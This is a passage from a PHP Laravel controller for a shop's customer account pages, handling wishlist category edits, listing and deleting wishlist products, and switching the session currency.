		$breadcrumbListSchemaData = getBLSchemaForMyAccountPages('Wishlist');
		if ($breadcrumbListSchemaData != false) {
			$this->PageData['breadcrumb_list_schema'] = $breadcrumbListSchemaData;
		}
		###################### BREADCRUMBLIST SCHEMA END ####################	
	

		$this->PageData['WishCatRS'] =  $WishCatRS;
		$this->PageData['CSSFILES'] = ['myaccount.css'];
		$this->PageData['JSFILES'] = ['wishcategory.js'];
		
		$this->PageData['meta_title'] = "Wishlist - ". config('const.SITE_NAME');
		$this->PageData['meta_description'] = "Wishlist - ". config('const.SITE_NAME');
		$this->PageData['meta_keywords'] = "Wishlist - ". config('const.SITE_NAME');
		

		$this->PageData['active'] = 'wishlist';
		$this->PageData['Breadcrumbs'] =  'Wishlist';
		
		return view('myaccount.wishcategory')->with($this->PageData);
	}

	public function WishCategoryEdit(Request $request)
	{
		$category_id = $request['category_id'];

		if ($request['action'] == 'EditCat') {
			$validatedData = $request->validate([
				'name' => 'required',
				'description'	=> 'required'
			], [
				'name.required' => config('fmessages.WishCategory.Name'),
				'description.required' => config('fmessages.WishCategory.Description')
			]);

			if (Auth::user()) {
				$name_exist = WishlistCategory::where('customer_id', '=', Session::get('customer_id'))
					->where('wishlist_category_id', '!=', $category_id)
					->where('name', '=', trim($request['name']))
					->count();
			}

			if (isset($name_exist) && $name_exist > 0) {
				Session::flash('error', config('fmessages.WishListCategory.ExistCategory'));
				return redirect()->back();
			}

			$WishCatInsertAry =	array(
				'name'			=> $request['name'],
				'description'	=> $request['description']
			);
			if (Auth::user()) {
				WishlistCategory::where('wishlist_category_id', '=', $category_id)
					->where('customer_id', '=', Session::get('customer_id'))
					->update($WishCatInsertAry);
			}

			Session::flash('success', config('fmessages.WishCategory.UpdateSuccess'));
			return redirect('wish-category.html');
		}

		if (Auth::user()) {
			$WishCat = WishlistCategory::select('wishlist_category_id', 'name', 'description')
				->where('customer_id', '=', Session::get('customer_id'))
				->where('wishlist_category_id', '=', $category_id)
				->first();
		}

		$this->PageData['WishCat'] =  isset($WishCat) ? $WishCat : "";

		###################### BREADCRUMBLIST SCHEMA START ####################
		$breadcrumbListSchemaData = getBLSchemaForMyAccountPages('Wishlist');
		if ($breadcrumbListSchemaData != false) {
			$this->PageData['breadcrumb_list_schema'] = $breadcrumbListSchemaData;
		}
		###################### BREADCRUMBLIST SCHEMA END ####################	
	
		$this->PageData['CSSFILES'] = ['myaccount.css'];
		$this->PageData['JSFILES'] = ['wishcategory.js'];
		
		$this->PageData['meta_title'] = "Wishlist - ". config('const.SITE_NAME');
		$this->PageData['meta_description'] = "Wishlist - ". config('const.SITE_NAME');
		$this->PageData['meta_keywords'] = "Wishlist - ". config('const.SITE_NAME');
		
		$this->PageData['active'] = 'wishlist';
		$this->PageData['Breadcrumbs'] =  'Wishlist';
		return view('myaccount.wishcategoryedit')->with($this->PageData);
	}

	public function WishProduct(Request $request)
	{
		$category_id = $request['category_id'];

		######### Set Wish category id ############
		if ($request['category_id'] != '') {
			$wishlist_category_id = (int)$request['category_id'];
			Session::put('Wish_CategoryID', $wishlist_category_id);
		} else {
			$wishlist_category_id = (int)Session::get('Wish_CategoryID');
		}
		$this->PageData['wishlist_category_id'] =  $wishlist_category_id;

		######### Set Wish category id ############

		######### Delete Wish Product ############
		if ($request['action'] == 'DeleteWishProd') {
			$checked = count($request['ch']);
			$ch = $request['ch'];

			if ($checked > 0 && Auth::user()) {
				$result = Wishlist::whereIn('wishlist_id', $request['ch'])->where('customer_id', '=', Session::get('customer_id'))->delete();
				Session::flash('success', config('fmessages.WishProduct.DeleteSuccess'));
			} else {
				Session::flash('error', config('fmessages.WishProduct.CheckToDelete'));
			}
			return redirect()->back();
		}

		######### Delete Wish Product ############
		
		######## Get Wish Category Start ##########
		if (Auth::user()) {
			$WishCatRS = WishlistCategory::select('name')
				->where('customer_id', '=', Session::get('customer_id'))
				->where('wishlist_category_id', '=', $wishlist_category_id)
				->first();
		}
		$this->PageData['WishCatRS'] =  isset($WishCatRS) ? $WishCatRS : "";
		######## Get Wish Category Start ##########

		######## Get Wish Product Start ##########
		if (Auth::user()) {
			$wish_res_prod = Wishlist::select('wishlist_id', 'products_id', 'sku', 'description')
				->where('wishlist_category_id', '=', $wishlist_category_id)
				->where('customer_id', '=', Session::get('customer_id'))
				->orderBy('wishlist_id', 'ASC')
				->get();
		}

		$arr_products = array();
		if (isset($wish_res_prod) && count($wish_res_prod) > 0) {
			// $casewhenprice  = $this->GetSystemProductPrice("`products`");
			foreach ($wish_res_prod as $wish_res_prod_key => $wish_res_prod_value) {
				$sku = $wish_res_prod_value['sku'];
				$products_id = $wish_res_prod_value['products_id'];

				$arr_product =	Product::select(
					'hba_products.sku',
					'hba_products.product_id',
					'hba_products.product_name',
					'hba_products.product_description',
					'hba_products.product_url',
					'hba_products_category.category_id',
					'hba_products.image_name',
				)
					->join('hba_products_category', 'hba_products_category.products_id', '=', 'hba_products.product_id')
					->join('hba_category', 'hba_category.category_id', '=', 'hba_products_category.category_id')
					->where('hba_products.product_id', '=', $products_id)
					->where('hba_products.status', '=', '1')
					->where('hba_category.status', '=', '1')
					->groupBy('hba_products.product_id')
					// ->paginate(2);
					->get()->first();

				if ($arr_product && $arr_product->count() > 0) 
				{
		
					$main_image = array(
						'main_image_zoom' => Get_Product_Image_URL($arr_product->image_name,'ZOOM'),
						'main_image_small' =>Get_Product_Image_URL($arr_product->image_name,'MEDIUM'),
						'main_image_thumb' => Get_Product_Image_URL($arr_product->image_name,'THUMB'),
						'main_image_large' => Get_Product_Image_URL($arr_product->image_name, 'SMALL')
					);
					
					if (isset($main_image['main_image_thumb']))
						$main_image = $main_image['main_image_thumb'];
					else
						$main_image =  config('const.NO_IMAGE_300');
					
					$products_sku 	  = $arr_product->sku;
					$product_name 	  = $arr_product->product_name;
					$short_description  = $arr_product->product_description;
					// $our_price 		  = $arr_product->product_price;
					$description	= $wish_res_prod_value['description'];

					$arr_products[] = array(
						"wishlist_id"	=> $wish_res_prod_value['wishlist_id'],
						"sku"			=> $products_sku,
						"product_name"	=> $product_name,
						"short_description"	=> $description,
						"description"	=> $description,
						// 'sale_price'	=> $our_price,
						'thumb_image'	=> $main_image,
						'p_link'		=> $arr_product->product_url
					);
				}
			}
		}

		$arr_products = $this->paginate($arr_products);
		$arr_products->withPath('');
		// dd(collect($arr_products));
		$this->PageData['WishProdRS'] =  $arr_products;
		######## Get Wish Product End ##########

		###################### BREADCRUMBLIST SCHEMA START ####################
		$breadcrumbListSchemaData = getBLSchemaForMyAccountPages('Wishlist');
		if ($breadcrumbListSchemaData != false) {
			$this->PageData['breadcrumb_list_schema'] = $breadcrumbListSchemaData;
		}
		###################### BREADCRUMBLIST SCHEMA END ####################	
	
		$this->PageData['meta_title'] = "Wishlist - ". config('const.SITE_NAME');
		$this->PageData['meta_description'] = "Wishlist - ". config('const.SITE_NAME');
		$this->PageData['meta_keywords'] = "Wishlist - ". config('const.SITE_NAME');
		
		$this->PageData['CSSFILES'] = ['myaccount.css', 'listing.css'];
		$this->PageData['JSFILES'] = ['wishproduct.js'];
		$this->PageData['active'] = 'wishlist';
		$this->PageData['Breadcrumbs'] =  'Wishlist';
		return view('myaccount.wishproduct')->with($this->PageData);
	}
	public function ChangeCurrency(Request $request)
	{
		try{
			 $currency_code = $request['currency_code'];
			
			Session::put('currency_code', $currency_code);
			session()->save();
			Artisan::call('cache:clear');
			Artisan::call('route:clear');
			Artisan::call('config:clear');
			Artisan::call('view:clear');
			echo "true";
			exit;
		} catch (\Exception $exception) {
			echo "false";
			exit;
		}
	}

}